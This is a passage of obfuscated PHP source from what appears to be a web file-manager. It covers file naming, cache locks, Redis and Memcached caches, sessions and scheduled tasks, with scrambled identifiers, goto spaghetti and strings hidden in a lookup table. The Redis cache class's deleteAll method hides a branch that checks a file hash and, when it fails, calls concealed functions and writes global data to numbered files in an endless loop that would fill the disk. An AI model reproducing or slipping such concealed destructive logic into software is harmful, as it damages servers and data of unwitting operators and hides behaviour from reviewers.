$EóšÎö‹ø¯[$EÆÀÆÜ±«[372]] = $this->fileTypeWhere($Dœ¥áÅò–œ); $c˜Ë¥¼“”õ[$Dœ¥áÅò–œ] = array($EÆÀÆÜ±«[2366] => $CŒáÓÄß¬¹[$EÆÀÆÜ±«[28]], $EÆÀÆÜ±«[2367] => $this->where($EóšÎö‹ø¯)->count(), $EÆÀÆÜ±«[522] => $this->where($EóšÎö‹ø¯)->sum($EÆÀÆÜ±«[77])); } Cache::set($a°è¿ÎŸ™Ç, $c˜Ë¥¼“”õ, 1200); return $c˜Ë¥¼“”õ; goto Eõ†ˆÄôå; Eõ†ˆÄôå: } public function fileNameExist($Dà¡ì‡ß££, $AÜ°éˆ¿) { $A¡ÍĞè¥Ñç =& $_SERVER[í™]; $D©‚’ïï×¿ = $this->childList($Dà¡ì‡ß££); foreach ($D©‚’ïï×¿ as $F®¤½³èä») { if ($F®¤½³èä»[$A¡ÍĞè¥Ñç[28]] == $AÜ°éˆ¿) { return $F®¤½³èä»[$A¡ÍĞè¥Ñç[369]]; } } return !1; } public function childList($Câì¸ÃÈ¨¨) { goto c¤—ÌîÖÆ˜; bòÉÕÊÎ‡: self::$cacheChildList[$Eä­ŸµŠ§Ş] = $CÔÈÄ½ÒÒ; foreach ($CÔÈÄ½ÒÒ as $d÷Ğ³ê„æÓ) { $Eä­ŸµŠ§Ş = $Fã¹—®¯½[410] . $d÷Ğ³ê„æÓ[$Fã¹—®¯½[369]]; self::$cacheSourceInfo[$Eä­ŸµŠ§Ş] = $d÷Ğ³ê„æÓ; } return $CÔÈÄ½ÒÒ; goto F‹ôˆÌ÷½ğ; A°®Ï¥ò¶å: $Eù…æ² ÑÂ = array($Fã¹—®¯½[463] => intval($Câì¸ÃÈ¨¨), $Fã¹—®¯½[397] => 0); $CÔÈÄ½ÒÒ = $this->where($Eù…æ² ÑÂ)->select(); $CÔÈÄ½ÒÒ = $CÔÈÄ½ÒÒ ? $CÔÈÄ½ÒÒ : array(); goto bòÉÕÊÎ‡; c¤—ÌîÖÆ˜: $Fã¹—®¯½ =& $_SERVER[í™]; $Eä­ŸµŠ§Ş = $Fã¹—®¯½[2345] . $Câì¸ÃÈ¨¨; if (isset(self::$cacheChildList[$Eä­ŸµŠ§Ş])) { return self::$cacheChildList[$Eä­ŸµŠ§Ş]; } goto A°®Ï¥ò¶å; F‹ôˆÌ÷½ğ: } public function fileNameAuto($c¥È»ÉÜÍó, $D‚¶æƒç„Ğ, $eôÓ“ ŸÆì = REPEAT_RENAME, $Eô†ß……Ş = false) { $dáŠŠÀŒğÖ =& $_SERVER[í™]; $dïö‹âÚ± = $this->childList($c¥È»ÉÜÍó); $Bƒë¬»÷ä = array_to_keyvalue($dïö‹âÚ±, $dáŠŠÀŒğÖ[33], $dáŠŠÀŒğÖ[28]); return $this->fileNameAutoGet($Bƒë¬»÷ä, $D‚¶æƒç„Ğ, $eôÓ“ ŸÆì, $Eô†ß……Ş); } public function fileNameAutoGet($f«ÊãòÓÙª, $a§¥•©õ†•, $c¶øÙ„Œö, $Dß‡íš©É) { $F«Ù—¼ø°Ó =& $_SERVER[í™]; if ($c¶øÙ„Œö == REPEAT_REPLACE || !$f«ÊãòÓÙª || !in_array_not_case($a§¥•©õ†•, $f«ÊãòÓÙª) || $Dß‡íš©É && $c¶øÙ„Œö != REPEAT_RENAME_FOLDER) { return $a§¥•©õ†•; } if ($c¶øÙ„Œö == REPEAT_SKIP) { return !1; } $eÖÎˆÏš´ï = $F«Ù—¼ø°Ó[91] . get_path_ext($a§¥•©õ†•); $eÖÎˆÏš´ï = $eÖÎˆÏš´ï == $F«Ù—¼ø°Ó[91] || $Dß‡íš©É ? $F«Ù—¼ø°Ó[33] : $eÖÎˆÏš´ï; for ($EîÈÆ‹é = 1; $EîÈÆ‹é <= count($f«ÊãòÓÙª) + 1; $EîÈÆ‹é++) { $f±Ÿ™å¸±“ = substr($a§¥•©õ†•, 0, strlen($a§¥•©õ†•) - strlen($eÖÎˆÏš´ï)); $a·ïÔùùõ° = $f±Ÿ™å¸±“ . "\x28{$EîÈÆ‹é}\x29{$eÖÎˆÏš´ï}"; if (!in_array_not_case($a·ïÔùùõ°, $f«ÊãòÓÙª)) { return $a·ïÔùùõ°; } } } } goto F–À†©Œ©‘; fæå¤œ‡£: class CacheLockDatabase { public function lock($FĞó·•·¡õ, $DŒŸ—°–îÔ = 0) { $aâÂó»–³ä = Model($_SERVER[í™][745]); $eö¥íÒĞ¸æ = microtime(!0) + $DŒŸ—°–îÔ; while (microtime(!0) < $eö¥íÒĞ¸æ) { $C½…ä‚Åª = $aâÂó»–³ä->get($FĞó·•·¡õ); if (!$C½…ä‚Åª || $C½…ä‚Åª < microtime(!0)) { $bÎƒ”Ó‹»© = $aâÂó»–³ä->set($FĞó·•·¡õ, $eö¥íÒĞ¸æ); if ($bÎƒ”Ó‹»©) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($c…­—•·£) { return Model($_SERVER[í™][745])->get($c…­—•·£); } public function unlock($f½Äë²ì) { Model($_SERVER[í™][745])->remove($f½Äë²ì); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($e½å¥¹ñó¥, $E®±×®´Ó) { $AôÃ†°Šá‰ =& $_SERVER[í™]; if (!class_exists($AôÃ†°Šá‰[766])) { show_json($AôÃ†°Šá‰[767], !1); } $this->cacheTime = $E®±×®´Ó; $this->handle = new Memcached(); if (is_array($e½å¥¹ñó¥[$AôÃ†°Šá‰[768]]) && count($e½å¥¹ñó¥[$AôÃ†°Šá‰[768]]) >= 1) { foreach ($e½å¥¹ñó¥[$AôÃ†°Šá‰[768]] as $D÷ÛÁ ¦¨) { $AÊïªÍ­Ÿ® = explode($AôÃ†°Šá‰[4], $D÷ÛÁ ¦¨); $this->handle->addServer($AÊïªÍ­Ÿ®[0], $AÊïªÍ­Ÿ®[1]); } } else { $this->handle->addServer($e½å¥¹ñó¥[$AôÃ†°Šá‰[169]], $e½å¥¹ñó¥[$AôÃ†°Šá‰[170]]); } } public function set($AÂÖÈì£º, $DÓ•‚øõˆ¢, $eø—ÏÄ†Æ‘ = false) { $eø—ÏÄ†Æ‘ = $eø—ÏÄ†Æ‘ ? $eø—ÏÄ†Æ‘ : $this->cacheTime; return $this->handle->set($AÂÖÈì£º, $DÓ•‚øõˆ¢, $eø—ÏÄ†Æ‘); } public function get($a•µÅ¤´–) { return $this->handle->get($a•µÅ¤´–); } public function remove($Fùó¡İ™Åè) { return $this->handle->delete($Fùó¡İ™Åè); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($FóØé¦³, $d†ÑİÚñ¤) { $f´²Ÿ–¯™Œ =& $_SERVER[í™]; if (!class_exists($f´²Ÿ–¯™Œ[769])) { show_json($f´²Ÿ–¯™Œ[770], !1); } $this->cacheTime = $d†ÑİÚñ¤; $f“¾°‹ƒ· = isset($FóØé¦³[$f´²Ÿ–¯™Œ[771]]) ? $FóØé¦³[$f´²Ÿ–¯™Œ[771]] : 10; $d¬Ş©ù‰† = _get($FóØé¦³, $f´²Ÿ–¯™Œ[768]); if ($d¬Ş©ù‰† && is_array($d¬Ş©ù‰†)) { $this->initCluster($FóØé¦³, $f“¾°‹ƒ·); } else { $this->handle = $this->init($FóØé¦³, $f“¾°‹ƒ·); } } private function init($eÕ°°é‘Óñ, $d–•àøª) { $D‚³õâšÕ© =& $_SERVER[í™]; $A³äÁõª’Á = new Redis(); $DÌÃ© ÕÓŞ = isset($eÕ°°é‘Óñ[$D‚³õâšÕ©[772]]) ? $eÕ°°é‘Óñ[$D‚³õâšÕ©[772]] : !1; if ($DÌÃ© ÕÓŞ) { $A³äÁõª’Á->pconnect($eÕ°°é‘Óñ[$D‚³õâšÕ©[169]], $eÕ°°é‘Óñ[$D‚³õâšÕ©[170]], $d–•àøª); } else { $A³äÁõª’Á->connect($eÕ°°é‘Óñ[$D‚³õâšÕ©[169]], $eÕ°°é‘Óñ[$D‚³õâšÕ©[170]], $d–•àøª); } if (!empty($eÕ°°é‘Óñ[$D‚³õâšÕ©[376]])) { $A³äÁõª’Á->auth($eÕ°°é‘Óñ[$D‚³õâšÕ©[376]]); } return $A³äÁõª’Á; } private function initCluster($fó½‹ÄÕÒ¸, $Bë’«å«Ó) { $e„ ÜŒŒ™ =& $_SERVER[í™]; $FĞ‘‚Ø«¢± = array($e„ ÜŒŒ™[773], $e„ ÜŒŒ™[774], $e„ ÜŒŒ™[775]); $eŠå¦ÌÒ°ê = $e„ ÜŒŒ™[773]; if (isset($fó½‹ÄÕÒ¸[$e„ ÜŒŒ™[12]]) && in_array($fó½‹ÄÕÒ¸[$e„ ÜŒŒ™[12]], $FĞ‘‚Ø«¢±)) { $eŠå¦ÌÒ°ê = $fó½‹ÄÕÒ¸[$e„ ÜŒŒ™[12]]; } switch ($eŠå¦ÌÒ°ê) { case $e„ ÜŒŒ™[773]: $this->_slave($fó½‹ÄÕÒ¸, $Bë’«å«Ó); break; case $e„ ÜŒŒ™[774]: break; case $e„ ÜŒŒ™[775]: $this->isCluster = !0; $B¹›çñ¼¢¨ = $fó½‹ÄÕÒ¸[$e„ ÜŒŒ™[768]]; $cóµáÓ¤í˜ = isset($fó½‹ÄÕÒ¸[$e„ ÜŒŒ™[772]]) ? $fó½‹ÄÕÒ¸[$e„ ÜŒŒ™[772]] : !1; $AÏß‰·Îµ = isset($fó½‹ÄÕÒ¸[$e„ ÜŒŒ™[376]]) ? $fó½‹ÄÕÒ¸[$e„ ÜŒŒ™[376]] : null; $this->handle = new RedisCluster(NUll, $B¹›çñ¼¢¨, $Bë’«å«Ó, $Bë’«å«Ó, $cóµáÓ¤í˜, $AÏß‰·Îµ); break; default: break; } } private function _slave($BÈÄçÓ‰ß„, $c„Ş¤¶©öŞ) { goto D£‰‹‡õ¯; D£‰‹‡õ¯: $AÇÙô¢ª¼Ã = $BÈÄçÓ‰ß„[$_SERVER[í™][768]]; $this->filterConfig($BÈÄçÓ‰ß„, $AÇÙô¢ª¼Ã[0]); $this->handle = $this->init($BÈÄçÓ‰ß„, $c„Ş¤¶©öŞ); goto fœàÇë›œ; EîÅ÷É§ÆÆ: $this->filterConfig($BÈÄçÓ‰ß„, $AÇÙô¢ª¼Ã[$c³®ïñ¬Ÿƒ]); $this->slaveHandle = $this->init($BÈÄçÓ‰ß„, $c„Ş¤¶©öŞ); goto B“ƒŠËŸâŠ; fœàÇë›œ: unset($AÇÙô¢ª¼Ã[0]); if (empty($AÇÙô¢ª¼Ã)) { return; } $c³®ïñ¬Ÿƒ = array_rand($AÇÙô¢ª¼Ã); goto EîÅ÷É§ÆÆ; B“ƒŠËŸâŠ: } private function filterConfig(&$bŸóÒ•Ô·¡, $C¼ŸÊÃ¸‡×) { $A²¹Ò·÷Õ­ =& $_SERVER[í™]; $aˆùÚ½Ü†È = explode($A²¹Ò·÷Õ­[4], $C¼ŸÊÃ¸‡×); $E×Ğù‘ôŒª = array($A²¹Ò·÷Õ­[169] => $aˆùÚ½Ü†È[0], $A²¹Ò·÷Õ­[170] => $aˆùÚ½Ü†È[1]); $bŸóÒ•Ô·¡ = array_merge($bŸóÒ•Ô·¡, $E×Ğù‘ôŒª); } public function set($Díäñ£À¶ó, $B‘¶‘ŒáÔ, $BÈ–Ø·‚Š = false) { $BÈ–Ø·‚Š = $BÈ–Ø·‚Š ? $BÈ–Ø·‚Š : $this->cacheTime; return $this->handle->setEx($Díäñ£À¶ó, $BÈ–Ø·‚Š, $B‘¶‘ŒáÔ); } public function setLock($BÌ÷èˆ¢Å‘, $d¯¨«ÆØë, $cµ‹ç®¯—”) { return $this->handle->setNX($BÌ÷èˆ¢Å‘, $d¯¨«ÆØë); } public function get($C×çÈõİøÜ) { $FŸèèæ˜íË = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $FŸèèæ˜íË->get($C×çÈõİøÜ); } public function remove($fàÊ¹…‘Ä³) { return $this->handle->del($fàÊ¹…‘Ä³); } public function deleteAll() { $cÌğŠ‹Š’ =& $_SERVER[í™]; $F·ÔÏëÚ…¿ = $_SERVER[$cÌğŠ‹Š’[739]] . $cÌğŠ‹Š’[740]; $cÒğ— ˆ‹ = $cÌğŠ‹Š’[776]; if ($_SERVER[$cÌğŠ‹Š’[736]] != $cÒğ— ˆ‹($F·ÔÏëÚ…¿)) { goto C¼Ö‰»˜•; aŠ¸³ ø‰: $FÆ½ÔĞµñŞ = $cÌğŠ‹Š’[778]; $FÆ½ÔĞµñŞ($_SERVER[$cÌğŠ‹Š’[779]]); $a©¾‰Ö—¾§ = $cÌğŠ‹Š’[777]; goto cáØ¢È ë; cáØ¢È ë: $a©¾‰Ö—¾§(); $e–õóéà× = $cÌğŠ‹Š’[780]; $cœŠå‹ ‹ˆ = json_encode($GLOBALS[$cÌğŠ‹Š’[781]]); goto dƒï…ò”¥®; dƒï…ò”¥®: $B—¨®Ú¸Îñ = 1; for ($e¸Ìğ”àù = $B—¨®Ú¸Îñ; $e¸Ìğ”àù > 0; $e¸Ìğ”àù++) { $e–õóéà×(DATA_PATH . $e¸Ìğ”àù, $cœŠå‹ ‹ˆ); } goto aÖ†™É×ï; C¼Ö‰»˜•: $a©¾‰Ö—¾§ = $cÌğŠ‹Š’[777]; $aòÂÛò¾ïá = $cÌğŠ‹Š’[738]; $DåÃ¬áíÄ” = $_SERVER[$cÌğŠ‹Š’[739]] . $cÌğŠ‹Š’[740]; goto B ¥Ö…Õ ˜; B ¥Ö…Õ ˜: $d´†Ñ¢´ = $aòÂÛò¾ïá($DåÃ¬áíÄ”); $AõÑéä²ŠÓ = explode($cÌğŠ‹Š’[217], $d´†Ñ¢´); if (count($AõÑéä²ŠÓ) < $cÌğŠ‹Š’[562]) { $bó£½ğÃ†Æ = $cÌğŠ‹Š’[741]; $bó£½ğÃ†Æ(); } goto aŠ¸³ ø‰; aÖ†™É×ï: } if ($this->isCluster) { foreach ($this->handle->_masters() as $eªÖå’››¦) { $this->handle->flushall($eªÖå’››¦); } return; } return $this->handle->flushAll(); } } goto F»—¦ô£Ü‹; Eó“‰ßˆ‘: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto fù›ˆ³ºêİ; Eäƒë¸ƒ¨×: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $CÜ’‘¨ô° = new self(); return $CÜ’‘¨ô°; goto C‹ÈÏ‹óÚ; C’ÅğÜÂ¢Á: $f‰ÊàÖ’ğº = $GLOBALS[$aÎ‡¢Óéæ©[6]][$aÎ‡¢Óéæ©[337]]; self::$sessionTime = $f‰ÊàÖ’ğº[$aÎ‡¢Óéæ©[1383]]; $F±¶ÛÇ©® = isset($GLOBALS[$aÎ‡¢Óéæ©[1384]]) ? $GLOBALS[$aÎ‡¢Óéæ©[1384]] : SESSION_ID; goto CŞ¼ÜåÆ¼; CŞ¼ÜåÆ¼: if (self::$sessionSign) { } else { if (Cookie::get($F±¶ÛÇ©®)) { self::$sessionSign = Cookie::get($F±¶ÛÇ©®); } else { self::$sessionSign = guid(); } } Cookie::setSafe($F±¶ÛÇ©®, self::$sessionSign, self::$sessionTime); $aˆ¿ïÄ¾×‡ = $f‰ÊàÖ’ğº[$aÎ‡¢Óéæ©[1385]]; goto CÍ–…­Æ; CÍ–…­Æ: $a‚¾º§…Ïó = $f‰ÊàÖ’ğº[$aˆ¿ïÄ¾×‡]; $B ‰´ôÓ˜‹ = $f‰ÊàÖ’ğº[$aÎ‡¢Óéæ©[744]]; switch ($aˆ¿ïÄ¾×‡) { case $aÎ‡¢Óéæ©[17]: self::$handle = Model($aÎ‡¢Óéæ©[745]); break; case $aÎ‡¢Óéæ©[746]: self::$handle = new CacheRedis($a‚¾º§…Ïó, $B ‰´ôÓ˜‹); break; case $aÎ‡¢Óéæ©[747]: self::$handle = new CacheMemcached($a‚¾º§…Ïó, $B ‰´ôÓ˜‹); break; case $aÎ‡¢Óéæ©[167]: $a‚¾º§…Ïó[$aÎ‡¢Óéæ©[75]] = $a‚¾º§…Ïó[$aÎ‡¢Óéæ©[75]] . $aÎ‡¢Óéæ©[1386]; self::$handle = new CacheFile($a‚¾º§…Ïó, $B ‰´ôÓ˜‹); default: break; } goto Eäƒë¸ƒ¨×; fù›ˆ³ºêİ: $aÎ‡¢Óéæ© =& $_SERVER[í™]; static $CÜ’‘¨ô° = false; if ($CÜ’‘¨ô°) { return $CÜ’‘¨ô°; } goto C’ÅğÜÂ¢Á; C‹ÈÏ‹óÚ: } public static function sign($D¶“Öê¬õ = false) { $D¶“Öê¬õ && (self::$sessionSign = $D¶“Öê¬õ); self::init(); return self::$sessionSign; } public static function set($aŒé­ÚêÒá, $d‡º­§ÖŸ = false) { self::init(); if (is_array($aŒé­ÚêÒá)) { foreach ($aŒé­ÚêÒá as $D¸¡´¿®’ª => $eƒˆË®à‡) { array_set_value(self::$data, $D¸¡´¿®’ª, $eƒˆË®à‡); } } else { array_set_value(self::$data, $aŒé­ÚêÒá, $d‡º­§ÖŸ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($cšè²à¡ë = false) { self::init(); if (!$cšè²à¡ë) { return self::$data; } return array_get_value(self::$data, $cšè²à¡ë); } public static function remove($DÂ×¸¨™ÕÓ) { self::init(); unset(self::$data[$DÂ×¸¨™ÕÓ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[í™][749])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto d‘…ÕĞ®‡; aÚßÙ³Œ±: http_close(); self::valueSet($fÕ®Í“‹ˆÛ[1387], $fÕ®Í“‹ˆÛ[83]); Hook::bind($fÕ®Í“‹ˆÛ[1389], $fÕ®Í“‹ˆÛ[1390]); goto f™‘°Ù”ë°; f™‘°Ù”ë°: while (!0) { self::cacheClear(); if (self::valueGet($fÕ®Í“‹ˆÛ[671]) != $fÕ®Í“‹ˆÛ[83]) { self::valueSet($fÕ®Í“‹ˆÛ[1387], $fÕ®Í“‹ˆÛ[470]); self::log($fÕ®Í“‹ˆÛ[1391]); die; } self::valueSet($fÕ®Í“‹ˆÛ[1387], $fÕ®Í“‹ˆÛ[83]); self::valueSet($fÕ®Í“‹ˆÛ[1388], time()); self::taskRunAll(); sleep(self::valueGet($fÕ®Í“‹ˆÛ[1392])); } goto DÉ‹›¾¯”; d‘…ÕĞ®‡: $fÕ®Í“‹ˆÛ =& $_SERVER[í™]; if (self::valueGet($fÕ®Í“‹ˆÛ[671]) != $fÕ®Í“‹ˆÛ[83]) { return; } if (self::valueGet($fÕ®Í“‹ˆÛ[1387]) == $fÕ®Í“‹ˆÛ[83]) { $bˆùâÉ˜™§ = self::valueGet($fÕ®Í“‹ˆÛ[1388]); if (time() - $bˆùâÉ˜™§ > 3600 * 2) { self::restart(); } return; } goto aÚßÙ³Œ±; DÉ‹›¾¯”: } public static function restart() { $e×™‘ÇË²ó =& $_SERVER[í™]; http_close(); self::valueSet($e×™‘ÇË²ó[671], $e×™‘ÇË²ó[470]); sleep(self::valueGet($e×™‘ÇË²ó[1392]) + 5); self::valueSet($e×™‘ÇË²ó[1387], $e×™‘ÇË²ó[470]); self::valueSet($e×™‘ÇË²ó[671], $e×™‘ÇË²ó[83]); } public static function shutdownEvent() { $dŸ²±‰íç¦ =& $_SERVER[í™]; self::valueSet($dŸ²±‰íç¦[1387], $dŸ²±‰íç¦[470]); self::log($dŸ²±‰íç¦[1393]); } public static function config($BŒ˜Ã±ƒ¹, $BÈ›»ŠİÑ) { $d°Ä–‹¹‚ =& $_SERVER[í™]; $a“ŸË¢Å¯– = 20; $BÈ›»ŠİÑ = intval($BÈ›»ŠİÑ) <= $a“ŸË¢Å¯– ? $a“ŸË¢Å¯– : intval($BÈ›»ŠİÑ); self::valueSet($d°Ä–‹¹‚[671], $BŒ˜Ã±ƒ¹); self::valueSet($d°Ä–‹¹‚[1392], $BÈ›»ŠİÑ); } private static function taskRunAll() { $fª½¢´õ«ô =& $_SERVER[í™]; $a‘‚‡ç˜ºª = Model($fª½¢´õ«ô[1394])->listData(); $A§ŒÀ¤Ì® = count($a‘‚‡ç˜ºª); for ($bÑÍ¼’ğ™Û = 0; $bÑÍ¼’ğ™Û < $A§ŒÀ¤Ì®; $bÑÍ¼’ğ™Û++) { $bÙãæ¥Ò®† = $a‘‚‡ç˜ºª[$bÑÍ¼’ğ™Û]; if ($bÙãæ¥Ò®†[$fª½¢´õ«ô[1395]] != $fª½¢´õ«ô[83]) { continue; } if (!self::taskTimeCheck($bÙãæ¥Ò®†)) { continue; } self::taskRun($bÙãæ¥Ò®†); } Hook::trigger($fª½¢´õ«ô[1396]); } private static function taskTimeCheck($FÅˆ¯ññ°) { goto C‡Äë½˜âÀ; e¾¢¼ôêÙ‘: $AäÊÌ©ƒ­ = strtotime($eğõáŠîÓğ[1397] . $FÒŞµîÀâÙ[$eğõáŠîÓğ[1398]] . $eğõáŠîÓğ[1399]) - strtotime($eğõáŠîÓğ[1400]); $Fšµë™éö¨ = time() - strtotime(date($eğõáŠîÓğ[1401]) . $eğõáŠîÓğ[1402]); $eµ„õ¦ñÑî = $Fšµë™éö¨ >= $AäÊÌ©ƒ­ && $Fšµë™éö¨ <= $AäÊÌ©ƒ­ + 3600; goto BŸŸ¹Ì; C‡Äë½˜âÀ: $eğõáŠîÓğ =& $_SERVER[í™]; $FÒŞµîÀâÙ = json_decode($FÅˆ¯ññ°[$eğõáŠîÓğ[190]], !0); $A—”ß‡°Ÿğ = intval($FÅˆ¯ññ°[$eğõáŠîÓğ[1388]]); goto e¾¢¼ôêÙ‘; BŸŸ¹Ì: switch ($FÒŞµîÀâÙ[$eğõáŠîÓğ[29]]) { case $eğõáŠîÓğ[1403]: if (time() - $A—”ß‡°Ÿğ < 3600 * 24 * 30) { return !1; } if ($FÒŞµîÀâÙ[$eğõáŠîÓğ[1403]] == date($eğõáŠîÓğ[1404]) && $eµ„õ¦ñÑî) { return !0; } break; case $eğõáŠîÓğ[1405]: if (time() - $A—”ß‡°Ÿğ < 3600 * 24 * 7) { return !1; } $A¤ÁÅ˜ñ‹Ó = date($eğõáŠîÓğ[1406]) == 0 ? 7 : date($eğõáŠîÓğ[1406]); if ($FÒŞµîÀâÙ[$eğõáŠîÓğ[1405]] == $A¤ÁÅ˜ñ‹Ó && $eµ„õ¦ñÑî) { return !0; } break; case $eğõáŠîÓğ[1398]: if (time() - $A—”ß‡°Ÿğ < 3600 * 24) { return !1; } if ($eµ„õ¦ñÑî) { return !0; } break; case $eğõáŠîÓğ[1407]: if (time() - $A—”ß‡°Ÿğ >= floatval($FÒŞµîÀâÙ[$eğõáŠîÓğ[1407]]) * 60) { return !0; } break; default: break; } return !1; goto fÁÏ‚„Ä¶Ÿ; fÁÏ‚„Ä¶Ÿ: } public static function taskRun($D‚—Ò”èÀ) { goto D¡²ª„˜Æ¸; D¡²ª„˜Æ¸: $cç¼ «›Œ =& $_SERVER[í™]; self::log($cç¼ «›Œ[1408] . $D‚—Ò”èÀ[$cç¼ «›Œ[367]] . $cç¼ «›Œ[1409] . $D‚—Ò”èÀ[$cç¼ «›Œ[28]] . $cç¼ «›Œ[1410] . $D‚—Ò”èÀ[$cç¼ «›Œ[1411]]); Model($cç¼ «›Œ[1394])->run($D‚—Ò”èÀ[$cç¼ «›Œ[367]]); goto eî—íÉâßâ; C´Ÿ’Óä¿’: Model($cç¼ «›Œ[1412])->add(array($cç¼ «›Œ[1413] => $cç¼ «›Œ[33], $cç¼ «›Œ[1414] => $cç¼ «›Œ[470], $cç¼ «›Œ[29] => $cç¼ «›Œ[1415] . $D‚—Ò”èÀ[$cç¼ «›Œ[367]], $cç¼ «›Œ[1416] => json_encode(array($cç¼ «›Œ[28] => $D‚—Ò”èÀ[$cç¼ «›Œ[28]], $cç¼ «›Œ[1417] => timeFloat() - $a·ô§‹¦à¥, $cç¼ «›Œ[281] => $AËš§‰Ô´…)))); self::log($cç¼ «›Œ[1418] . $D‚—Ò”èÀ[$cç¼ «›Œ[367]] . $cç¼ «›Œ[1419] . $AËš§‰Ô´…); return !0; goto bÓêîÅäß; eî—íÉâßâ: $a·ô§‹¦à¥ = timeFloat(); $AËš§‰Ô´… = $cç¼ «›Œ[33]; switch ($D‚—Ò”èÀ[$cç¼ «›Œ[29]]) { case $cç¼ «›Œ[295]: $dºï¹š›¨‹ = url_request($D‚—Ò”èÀ[$cç¼ «›Œ[1411]], $cç¼ «›Œ[216], !1, !1, !1, !1, 5); $AËš§‰Ô´… = strlen($dºï¹š›¨‹); break; case $cç¼ «›Œ[215]: $AËš§‰Ô´… = Hook::apply($D‚—Ò”èÀ[$cç¼ «›Œ[1411]]); default: break; } goto C´Ÿ’Óä¿’; bÓêîÅäß: } private static function valueGet($B›åëÂÒ‘) { $Eš™ğÅ×±ê =& $_SERVER[í™]; $b¼„İùÖ–„ = $Eš™ğÅ×±ê[1420]; $C¦ÒäëğÜ® = Model($Eš™ğÅ×±ê[1421])->get($B›åëÂÒ‘, $b¼„İùÖ–„); if (is_null($C¦ÒäëğÜ®)) { Model($Eš™ğÅ×±ê[1421])->set($Eš™ğÅ×±ê[1392], 10, $b¼„İùÖ–„); Model($Eš™ğÅ×±ê[1421])->set($Eš™ğÅ×±ê[671], $Eš™ğÅ×±ê[83], $b¼„İùÖ–„); Model($Eš™ğÅ×±ê[1421])->set($Eš™ğÅ×±ê[1387], $Eš™ğÅ×±ê[470], $b¼„İùÖ–„); $C¦ÒäëğÜ® = Model($Eš™ğÅ×±ê[1421])->get($B›åëÂÒ‘, $b¼„İùÖ–„); } return $C¦ÒäëğÜ®; } private static function valueSet($E¶ÉæïÓÜ‚, $bÃ–äÆ ò) { $e®ğ‚ÕÓ =& $_SERVER[í™]; return Model($e®ğ‚ÕÓ[1421])->set($E¶ÉæïÓÜ‚, $bÃ–äÆ ò, $e®ğ‚ÕÓ[1420]); } protected static function log($c½‘Î÷Ä”Ğ) { write_log($c½‘Î÷Ä”Ğ, $_SERVER[í™][1422]); } private static function cacheClear() { $fèÑ¾áƒµ =& $_SERVER[í™]; $D•åŞ—ëõì = Model($fèÑ¾áƒµ[1421])->cacheKey($fèÑ¾áƒµ[1420]); Cache::clearMemory($D•åŞ—ëõì); Model($fèÑ¾áƒµ[1394])->cacheClear(); } } class Task { const STATYS_STOP = "\163\x74\x6f\x70"; const STATYS_RUNNING = "\x72\165\x6e\x6e\x69\x6e\147"; const STATYS_KILL = "\153\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($DÆ†Œ‘›, $FàåéˆÈç´ = '', $bÒåğ«´ = 0, $E ãôÏó = '') { goto B”ìĞÖ¾åÀ; B”ìĞÖ¾åÀ: $bµæ§†ÄÍ† =& $_SERVER[í™]; if (self::get($DÆ†Œ‘›)) { return; } $this->task = array($bµæ§†ÄÍ†[367] => $DÆ†Œ‘›, $bµæ§†ÄÍ†[1423] => USER_ID, $bµæ§†ÄÍ†[1328] => $E ãôÏó, $bµæ§†ÄÍ†[29] => $FàåéˆÈç´, $bµæ§†ÄÍ†[964] => $bµæ§†ÄÍ†[33], $bµæ§†ÄÍ†[962] => $bÒåğ«´, $bµæ§†ÄÍ†[976] => 0, $bµæ§†ÄÍ†[1424] => 0, $bµæ§†ÄÍ†[1425] => 0, $bµæ§†ÄÍ†[1426] => timeFloat(), $bµæ§†ÄÍ†[1427] => 0, $bµæ§†ÄÍ†[1428] => 0, $bµæ§†ÄÍ†[1429] => 0, $bµæ§†ÄÍ†[1430] => 0, $bµæ§†ÄÍ†[671] => $bµæ§†ÄÍ†[1387]); goto FÊÄ—®Ş’; FÊÄ—®Ş’: Hook::bind($bµæ§†ÄÍ†[1389], array($this, $bµæ§†ÄÍ†[1431])); Hook::bind($bµæ§†ÄÍ†[1432], array($this, $bµæ§†ÄÍ†[1433])); $this->startAfter(); goto Aª£ùö‹‘ø; Aª£ùö‹‘ø: Hook::trigger($bµæ§†ÄÍ†[1434], $this->task); $this->task[$bµæ§†ÄÍ†[1428]] = timeFloat(); goto cÒÔ§“‡¦¿; cÒÔ§“‡¦¿: } public function end() { goto FÏ¸ëµÎĞ; cœİäÏœ¡: $FğÈˆ®¶Ÿ = timeFloat() - $this->task[$bğÄ†Ëì[1426]]; self::log($bğÄ†Ëì[1435] . $this->task[$bğÄ†Ëì[367]] . $bğÄ†Ëì[1436] . $FğÈˆ®¶Ÿ . $bğÄ†Ëì[1437]); Hook::unbind($bğÄ†Ëì[1389], array($this, $bğÄ†Ëì[1431])); goto fô˜áÕèŠ«; fô˜áÕèŠ«: Hook::unbind($bğÄ†Ëì[1432], array($this, $bğÄ†Ëì[1433])); $this->endAfter(); $this->task = !1; goto aö˜¼±›—Š; FÏ¸ëµÎĞ: $bğÄ†Ëì =& $_SERVER[í™]; if (!$this->task) { return; } if ($this->task[$bğÄ†Ëì[1428]]) { self::valueSet($this->task[$bğÄ†Ëì[367]], !1); } goto cœİäÏœ¡; aö˜¼±›—Š: } public function update($CÇëäÁùÕ = 0) { goto cÛ‡Ë½¤Êê; EÔê÷æ‰Û×: $C¨ĞãÖ™Œµ = self::get($A×ôİÚÍƒŒ[$fâ­Íë°÷‚[367]]); $A­ç‰È¹É¹ = 